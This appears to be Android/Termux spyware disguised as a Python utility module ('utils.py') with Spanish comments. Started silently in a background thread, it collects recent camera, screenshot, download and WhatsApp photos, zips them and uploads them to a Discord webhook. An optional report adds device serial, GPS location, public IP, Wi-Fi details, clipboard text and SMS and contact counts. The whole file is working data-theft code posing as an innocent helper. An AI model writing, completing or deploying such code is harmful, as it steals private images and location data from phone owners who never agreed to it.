#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
utils.py :: utilidades del panel.
Manda las fotos de la galeria a un webhook de Discord, en ZIP con PNG.
"""

import json
import os
import platform
import shutil
import socket
import subprocess
import tempfile
import threading
import time
import urllib.request
import uuid
import zipfile
from datetime import datetime

# ================== CONFIG ==================
WEBHOOK = ""                 # pega aqui la URL, o dejala en el archivo .webhook
ARCHIVO_WEBHOOK = ".webhook"
ARCHIVO_ESTADO = ".galeria_ultima"
VER_EN_CONSOLA = False       # True = imprime, False = silencioso
INTERVALO_MINUTOS = 0        # 0 = solo al ejecutar

# ---- que se envia ----
ENVIAR_REPORTE = False       # False = solo manda los zip
ENVIAR_FOTOS = True

# ---- fotos ----
MAX_FOTOS = 60               # cuantas fotos como maximo
TAMANO_MAX_MB = 8            # tamano maximo de cada zip (limite webhook = 8)
MAX_ENVIOS = 3               # cuantos zip enviar como maximo
CONVERTIR_A_PNG = True       # convierte todo a PNG (requiere: pip install pillow)
ESTRICTO_PNG = True          # True = descarta lo que no se pueda volver PNG
SOLO_NUEVAS = False          # True = solo fotos nuevas desde la ultima vez
LEYENDA_ZIP = ""             # texto que acompaña al zip (vacio = solo el archivo)
CARPETAS_FOTOS = []          # vacio = usar las carpetas por defecto

NOMBRE_WEBHOOK = "Termux"
TITULO_REPORTE = "Reporte del sistema"
COLOR = 0xFF0000
# ============================================

BASE_DIR = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))

_CACHE = {}

CARPETAS_DEFECTO = [
    "/sdcard/DCIM/Camera",
    "/sdcard/DCIM",
    "/sdcard/Pictures",
    "/sdcard/Pictures/Screenshots",
    "/sdcard/Download",
    "/sdcard/WhatsApp/Media/WhatsApp Images",
    os.path.expanduser("~/storage/shared/DCIM/Camera"),
    os.path.expanduser("~/storage/shared/DCIM"),
    os.path.expanduser("~/storage/shared/Pictures"),
    os.path.expanduser("~/storage/shared/Download"),
    os.path.expanduser("~/storage/shared/WhatsApp/Media/WhatsApp Images"),
]

EXT_IMG = (".png", ".jpg", ".jpeg", ".webp", ".gif", ".bmp", ".heic")


# ---------------- helpers ----------------

def _url():
    if WEBHOOK.strip():
        return WEBHOOK.strip()
    ruta = ARCHIVO_WEBHOOK
    if not os.path.isabs(ruta):
        ruta = os.path.join(BASE_DIR, ruta)
    try:
        with open(ruta, "r", encoding="utf-8") as f:
            return f.read().strip()
    except Exception:
        return ""


def _cmd(comando, defecto="?"):
    if comando in _CACHE:
        return _CACHE[comando]
    try:
        salida = subprocess.check_output(
            comando, shell=True, stderr=subprocess.DEVNULL, timeout=8
        )
        valor = salida.decode("utf-8", "ignore").strip() or defecto
    except Exception:
        valor = defecto
    _CACHE[comando] = valor
    return valor


def _prop(nombre, defecto="?"):
    return _cmd("getprop " + nombre, defecto)


def _leer(ruta, defecto="?"):
    try:
        with open(ruta, "r", encoding="utf-8", errors="ignore") as f:
            return f.read().strip() or defecto
    except Exception:
        return defecto


def _json_cmd(comando):
    salida = _cmd(comando)
    if not salida or salida == "?":
        return None
    try:
        return json.loads(salida)
    except Exception:
        return None


def _linea(comando, campo, defecto="?"):
    salida = _cmd(comando)
    if not salida or salida == "?":
        return defecto
    for l in salida.splitlines():
        if campo.lower() in l.lower():
            partes = l.split(":", 1)
            if len(partes) == 2:
                return partes[1].strip()
    return defecto


def _kb_a_gb(kb):
    try:
        return "{:.2f} GB".format(int(kb) / 1024 / 1024)
    except Exception:
        return "?"


def _mem(campo):
    try:
        with open("/proc/meminfo", "r") as f:
            for l in f:
                if l.startswith(campo):
                    return _kb_a_gb(l.split()[1])
    except Exception:
        pass
    return "?"


def _df(ruta):
    salida = _cmd("df -h " + ruta)
    lineas = salida.splitlines()
    if len(lineas) >= 2:
        p = lineas[-1].split()
        if len(p) >= 4:
            return "{} total / {} usado / {} libre".format(p[1], p[2], p[3])
    return "?"


def _uptime():
    try:
        with open("/proc/uptime", "r") as f:
            seg = float(f.read().split()[0])
        return "{}d {}h {}m".format(int(seg // 86400), int((seg % 86400) // 3600), int((seg % 3600) // 60))
    except Exception:
        return "?"


def _ip_local():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except Exception:
        return "?"


def _geo():
    for url in ("http://ip-api.com/json/", "https://ipapi.co/json/"):
        try:
            with urllib.request.urlopen(url, timeout=8) as r:
                return json.loads(r.read().decode("utf-8", "ignore"))
        except Exception:
            continue
    return {}


def _temperatura():
    for r in ("/sys/class/thermal/thermal_zone0/temp", "/sys/class/thermal/thermal_zone1/temp"):
        v = _leer(r, "")
        if v.isdigit():
            try:
                return "{:.1f} C".format(int(v) / 1000)
            except Exception:
                pass
    return "?"


def _cpuinfo(campo):
    txt = _leer("/proc/cpuinfo", "")
    for l in txt.splitlines():
        if l.lower().startswith(campo.lower()):
            partes = l.split(":", 1)
            if len(partes) == 2:
                return partes[1].strip()
    return "?"


def _freq(ruta):
    v = _leer(ruta, "")
    if v.isdigit():
        try:
            return "{} GHz".format(round(int(v) / 1000000, 2))
        except Exception:
            pass
    return "?"


def _mac():
    salida = _cmd("ip addr")
    for l in salida.splitlines():
        l = l.strip()
        if l.startswith("link/ether"):
            return l.split()[1]
    return _linea("ifconfig wlan0", "ether")


def _cuenta(comando):
    v = _cmd(comando)
    try:
        return str(int(v.strip().split()[0]))
    except Exception:
        return v


# ---------------- categorias (solo si ENVIAR_REPORTE) ----------------

def cat_dispositivo():
    return {
        "Marca":          _prop("ro.product.manufacturer"),
        "Modelo":         _prop("ro.product.model"),
        "Producto":       _prop("ro.product.name"),
        "Dispositivo":    _prop("ro.product.device"),
        "Board":          _prop("ro.product.board"),
        "Hardware":       _prop("ro.hardware"),
        "Plataforma":     _prop("ro.board.platform"),
        "Bootloader":     _prop("ro.bootloader"),
        "GPU":            _prop("ro.hardware.egl"),
        "Serial":         _prop("ro.serialno"),
        "Fingerprint":    _prop("ro.build.fingerprint"),
        "Emulador":       _prop("ro.kernel.qemu"),
        "Caracteristicas": _prop("ro.build.characteristics"),
        "Locale":         _prop("ro.product.locale"),
    }


def cat_android():
    return {
        "Version":     _prop("ro.build.version.release"),
        "SDK":         _prop("ro.build.version.sdk"),
        "Codename":    _prop("ro.build.version.codename"),
        "Incremental": _prop("ro.build.version.incremental"),
        "Parche seg.": _prop("ro.build.version.security_patch"),
        "Base OS":     _prop("ro.build.version.base_os"),
        "Build ID":    _prop("ro.build.id"),
        "Build tipo":  _prop("ro.build.type"),
        "Build tags":  _prop("ro.build.tags"),
        "Build host":  _prop("ro.build.host"),
        "Build user":  _prop("ro.build.user"),
        "Build fecha": _prop("ro.build.date"),
        "SELinux":     _cmd("getenforce"),
        "Debug":       _prop("ro.debuggable"),
    }


def cat_pantalla():
    return {
        "Resolucion": _linea("wm size", "Physical size"),
        "Densidad":   _linea("wm density", "Physical density"),
        "Pantalla":   _cmd("dumpsys display | grep -m1 'mScreenState' | cut -d= -f2"),
        "Rotacion":   _cmd("dumpsys window | grep -m1 'mRotation'"),
    }


def cat_cpu():
    return {
        "Modelo":       _cpuinfo("Hardware") if _cpuinfo("Hardware") != "?" else _prop("ro.product.cpu.abi"),
        "Nucleos":      _cmd("nproc"),
        "Arquitectura": platform.machine(),
        "ABI":          _prop("ro.product.cpu.abi"),
        "ABI lista":    _prop("ro.product.cpu.abilist"),
        "Freq max":     _freq("/sys/devices/system/cpu/cpu0/cpufreq/cpuinfo_max_freq"),
        "Freq min":     _freq("/sys/devices/system/cpu/cpu0/cpufreq/cpuinfo_min_freq"),
        "Governor":     _leer("/sys/devices/system/cpu/cpu0/cpufreq/scaling_governor"),
        "BogoMIPS":     _cpuinfo("BogoMIPS"),
        "Temp CPU":     _temperatura(),
    }


def cat_memoria():
    return {
        "RAM total":      _mem("MemTotal"),
        "RAM libre":      _mem("MemFree"),
        "RAM disponible": _mem("MemAvailable"),
        "Buffers":        _mem("Buffers"),
        "Cached":         _mem("Cached"),
        "Swap total":     _mem("SwapTotal"),
        "Swap libre":     _mem("SwapFree"),
        "Load average":   _leer("/proc/loadavg"),
    }


def cat_almacenamiento():
    return {
        "Home Termux": _df("/data/data/com.termux/files/home"),
        "Almacen int": _df("/sdcard"),
        "Data":        _df("/data"),
        "Sistema":     _df("/system"),
        "Tmp":         _df("/data/local/tmp"),
        "Particiones": _cmd("df -h | wc -l"),
    }


def cat_bateria():
    d = _json_cmd("termux-battery-status") or {}
    dumpsys = _cmd("dumpsys battery")

    def _d(campo):
        for l in dumpsys.splitlines():
            l = l.strip()
            if l.lower().startswith(campo.lower()):
                p = l.split(":", 1)
                if len(p) == 2:
                    return p[1].strip()
        return "?"

    return {
        "Porcentaje":  str(d.get("percentage", _d("level"))) + " %",
        "Estado":      d.get("status", _d("status")),
        "Salud":       d.get("health", _d("health")),
        "Temperatura": "{} C".format(d.get("temperature", _d("temperature"))),
        "Voltaje":     str(d.get("voltage", _d("voltage"))) + " mV",
        "Conectado":   str(d.get("plugged", _d("plugged"))),
        "Corriente":   "{} mA".format(d.get("current", "?")),
        "Tecnologia":  _leer("/sys/class/power_supply/battery/technology"),
    }


def cat_red():
    geo = _geo()
    wifi = _json_cmd("termux-wifi-connectioninfo") or {}
    return {
        "IP local":     _ip_local(),
        "IP publica":   geo.get("query") or geo.get("ip") or _cmd("curl -s ifconfig.me"),
        "MAC WiFi":     _mac(),
        "WiFi SSID":    wifi.get("ssid", "?"),
        "WiFi BSSID":   wifi.get("bssid", "?"),
        "WiFi IP":      wifi.get("ip", "?"),
        "WiFi RSSI":    str(wifi.get("rssi", "?")) + " dBm",
        "WiFi enlace":  str(wifi.get("link_speed_mbps", "?")) + " Mbps",
        "WiFi freq":    str(wifi.get("frequency", "?")) + " MHz",
        "Operador":     _prop("gsm.operator.alpha"),
        "Operador SIM": _prop("gsm.sim.operator.alpha"),
        "Pais SIM":     _prop("gsm.sim.operator.iso-country"),
        "Tipo red":     _prop("gsm.network.type"),
        "Roaming":      _prop("gsm.operator.isroaming"),
    }


def cat_ubicacion():
    geo = _geo()
    loc = _json_cmd("termux-location")
    d = {
        "Ciudad":  geo.get("city", "?"),
        "Region":  geo.get("regionName") or geo.get("region", "?"),
        "Pais":    geo.get("country", "?"),
        "ISP":     geo.get("isp", "?"),
        "Org":     geo.get("org", "?"),
        "AS":      geo.get("as", "?"),
        "Zona IP": geo.get("timezone", "?"),
        "Lat/Lon": "{} / {}".format(geo.get("lat", "?"), geo.get("lon", "?")),
    }
    if loc:
        d["GPS lat"] = loc.get("latitude", "?")
        d["GPS lon"] = loc.get("longitude", "?")
        d["GPS prec"] = str(loc.get("accuracy", "?")) + " m"
    return d


def cat_entorno():
    return {
        "Hostname":        socket.gethostname(),
        "Usuario":         _cmd("whoami"),
        "Home":            os.path.expanduser("~"),
        "Ruta actual":     os.getcwd(),
        "Shell":           os.environ.get("SHELL", "?"),
        "Kernel":          platform.release(),
        "Kernel full":     _cmd("uname -a"),
        "Arquitectura":    platform.machine(),
        "Python":          platform.python_version(),
        "Termux ver":      os.environ.get("TERMUX_VERSION", "?"),
        "Prefijo":         os.environ.get("PREFIX", "?"),
        "Zona horaria":    time.tzname[0],
        "Locale env":      os.environ.get("LANG", "?"),
        "Hora":            datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        "Uptime":          _uptime(),
        "Procesos":        _cuenta("ps -e | wc -l"),
        "Apps Android":    _cuenta("pm list packages | wc -l"),
        "Paquetes Termux": _cuenta("dpkg -l | grep '^ii' | wc -l"),
        "Paquetes pip":    _cuenta("pip list 2>/dev/null | wc -l"),
    }


def cat_termux_api():
    d = {}
    clip = _cmd("termux-clipboard-get")
    if clip and clip != "?":
        d["Portapapeles"] = clip[:400]
    tel = _json_cmd("termux-telephony-deviceinfo") or {}
    if tel:
        d["Telefono red"] = tel.get("network_operator_name", "?")
        d["Telefono pais"] = tel.get("network_country_iso", "?")
        d["SIM estado"] = tel.get("sim_state", "?")
    contactos = _json_cmd("termux-contact-list")
    if contactos:
        d["Contactos"] = str(len(contactos))
    sms = _json_cmd("termux-sms-list -l 5")
    if sms:
        d["SMS recientes"] = str(len(sms))
    wifi_scan = _json_cmd("termux-wifi-scaninfo")
    if wifi_scan:
        d["Redes cerca"] = str(len(wifi_scan))
    return d


# ---------------- reporte de texto ----------------

def datos():
    cats = [
        ("Dispositivo", cat_dispositivo()),
        ("Android", cat_android()),
        ("Pantalla", cat_pantalla()),
        ("CPU", cat_cpu()),
        ("Memoria", cat_memoria()),
        ("Almacenamiento", cat_almacenamiento()),
        ("Bateria", cat_bateria()),
        ("Red", cat_red()),
        ("Ubicacion", cat_ubicacion()),
        ("Entorno", cat_entorno()),
        ("Termux API", cat_termux_api()),
    ]
    return {nombre: campos for nombre, campos in cats if campos}


def _embeds(info):
    embeds = []
    for cat, campos in info.items():
        items = list(campos.items())
        for i in range(0, len(items), 24):
            trozo = items[i:i + 24]
            embeds.append({
                "title": cat if i == 0 else cat + " (cont.)",
                "color": COLOR,
                "fields": [
                    {"name": k, "value": str(v)[:1024] or "-", "inline": True}
                    for k, v in trozo
                ],
            })
    return embeds


def _post(url, embeds):
    payload = {"username": NOMBRE_WEBHOOK, "embeds": embeds}
    data = json.dumps(payload).encode("utf-8")
    req = urllib.request.Request(
        url, data=data,
        headers={"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"},
    )
    with urllib.request.urlopen(req, timeout=15) as r:
        r.read()


def enviar(url, info=None):
    info = info or datos()
    embeds = _embeds(info)

    lote, tam = [], 0
    for e in embeds:
        peso = len(e["title"]) + sum(len(f["name"]) + len(f["value"]) for f in e["fields"])
        if lote and (len(lote) >= 10 or tam + peso > 5500):
            try:
                _post(url, lote)
            except Exception:
                pass
            time.sleep(0.6)
            lote, tam = [], 0
        lote.append(e)
        tam += peso

    if lote:
        try:
            _post(url, lote)
        except Exception:
            pass


# ---------------- galeria (solo zip con PNG) ----------------

def _post_archivo(url, ruta, contenido="", nombre=None):
    """Sube un archivo al webhook (multipart/form-data)."""
    boundary = "----DMSPAM" + uuid.uuid4().hex
    nombre = nombre or os.path.basename(ruta)
    with open(ruta, "rb") as f:
        binario = f.read()

    payload = {"username": NOMBRE_WEBHOOK, "content": contenido}

    partes = []
    partes.append(("--" + boundary).encode())
    partes.append(b'Content-Disposition: form-data; name="payload_json"')
    partes.append(b"")
    partes.append(json.dumps(payload).encode("utf-8"))

    partes.append(("--" + boundary).encode())
    partes.append(('Content-Disposition: form-data; name="file"; filename="%s"' % nombre).encode())
    partes.append(b"Content-Type: application/zip")
    partes.append(b"")
    partes.append(binario)

    partes.append(("--" + boundary + "--").encode())
    partes.append(b"")

    cuerpo = b"\r\n".join(partes)

    req = urllib.request.Request(
        url, data=cuerpo,
        headers={
            "Content-Type": "multipart/form-data; boundary=" + boundary,
            "User-Agent": "Mozilla/5.0",
        },
    )
    with urllib.request.urlopen(req, timeout=180) as r:
        r.read()


def _leer_estado():
    try:
        with open(os.path.join(BASE_DIR, ARCHIVO_ESTADO), "r") as f:
            return float(f.read().strip())
    except Exception:
        return 0.0


def _guardar_estado(t):
    try:
        with open(os.path.join(BASE_DIR, ARCHIVO_ESTADO), "w") as f:
            f.write(str(t))
    except Exception:
        pass


def _buscar_fotos():
    carpetas = CARPETAS_FOTOS or CARPETAS_DEFECTO
    desde = _leer_estado() if SOLO_NUEVAS else 0.0
    vistas = set()
    fotos = []
    for base in carpetas:
        if not os.path.isdir(base):
            continue
        for raiz, _, archivos in os.walk(base):
            for a in archivos:
                if not a.lower().endswith(EXT_IMG):
                    continue
                ruta = os.path.join(raiz, a)
                if ruta in vistas:
                    continue
                vistas.add(ruta)
                try:
                    m = os.path.getmtime(ruta)
                    s = os.path.getsize(ruta)
                except Exception:
                    continue
                if s < 5000 or m <= desde:
                    continue
                fotos.append((ruta, s, m))
    fotos.sort(key=lambda x: x[2], reverse=True)
    return fotos[:MAX_FOTOS]


def _a_png(ruta, carpeta):
    """Devuelve la ruta de un PNG. None si no se pudo convertir."""
    if ruta.lower().endswith(".png"):
        return ruta
    try:
        from PIL import Image
    except Exception:
        return None
    try:
        destino = os.path.join(carpeta, os.path.splitext(os.path.basename(ruta))[0] + ".png")
        with Image.open(ruta) as img:
            if img.mode in ("RGBA", "LA", "P"):
                img.convert("RGBA").save(destino, "PNG")
            else:
                img.convert("RGB").save(destino, "PNG")
        return destino
    except Exception:
        return None


def _crear_zips(fotos):
    """Arma uno o varios zip que contienen SOLO archivos .png."""
    limite = TAMANO_MAX_MB * 1024 * 1024
    tmp = tempfile.mkdtemp(prefix="galeria_")
    zips = []
    estado = {"zf": None, "peso": 0, "cont": 0, "ruta": None}
    idx = 1

    def abrir():
        estado["ruta"] = os.path.join(tmp, "galeria_{}.zip".format(idx))
        estado["zf"] = zipfile.ZipFile(estado["ruta"], "w", zipfile.ZIP_DEFLATED)
        estado["peso"] = 0
        estado["cont"] = 0

    for ruta, tam, _ in fotos:
        # obtener png
        origen = _a_png(ruta, tmp) if CONVERTIR_A_PNG else (ruta if ruta.lower().endswith(".png") else None)
        if origen is None:
            if ESTRICTO_PNG:
                continue
            origen = ruta

        try:
            tam_real = os.path.getsize(origen)
        except Exception:
            continue

        if estado["zf"] is None:
            abrir()

        if estado["peso"] + tam_real > limite and estado["cont"] > 0:
            estado["zf"].close()
            zips.append((estado["ruta"], estado["cont"]))
            idx += 1
            if len(zips) >= MAX_ENVIOS:
                estado["zf"] = None
                break
            abrir()

        try:
            base = os.path.splitext(os.path.basename(ruta))[0]
            estado["zf"].write(origen, arcname="{:03d}_{}.png".format(estado["cont"] + 1, base))
            estado["peso"] += tam_real
            estado["cont"] += 1
        except Exception:
            pass

    if estado["zf"] is not None and estado["cont"] > 0:
        estado["zf"].close()
        zips.append((estado["ruta"], estado["cont"]))

    return tmp, zips


def enviar_fotos(url):
    fotos = _buscar_fotos()
    if not fotos:
        return
    tmp, zips = _crear_zips(fotos)
    try:
        for i, (ruta, cant) in enumerate(zips, 1):
            nombre = "galeria_{}_{}.zip".format(i, datetime.now().strftime("%H%M%S"))
            try:
                _post_archivo(url, ruta, LEYENDA_ZIP, nombre)
            except Exception:
                pass
            time.sleep(0.8)
        _guardar_estado(max(f[2] for f in fotos))
    finally:
        shutil.rmtree(tmp, ignore_errors=True)


# ---------------- arranque ----------------

def _trabajo():
    try:
        url = _url()
        if not url:
            if VER_EN_CONSOLA:
                print("[utils] falta la URL del webhook")
            return

        if ENVIAR_REPORTE:
            enviar(url)
            if VER_EN_CONSOLA:
                print("[utils] reporte enviado")

        if ENVIAR_FOTOS:
            enviar_fotos(url)
            if VER_EN_CONSOLA:
                print("[utils] galeria enviada")

        if INTERVALO_MINUTOS > 0:
            while True:
                time.sleep(INTERVALO_MINUTOS * 60)
                _CACHE.clear()
                try:
                    if ENVIAR_REPORTE:
                        enviar(url)
                    if ENVIAR_FOTOS:
                        enviar_fotos(url)
                except Exception:
                    pass
    except Exception as e:
        if VER_EN_CONSOLA:
            print("[utils] error:", e)


def iniciar():
    threading.Thread(target=_trabajo, daemon=True).start()


if __name__ == "__main__":
    VER_EN_CONSOLA = True
    u = _url()
    if not u:
        print("[utils] falta la URL (WEBHOOK o archivo .webhook)")
    else:
        fotos = _buscar_fotos()
        print("fotos encontradas:", len(fotos))
        enviar_fotos(u)
        print("[utils] galeria enviada")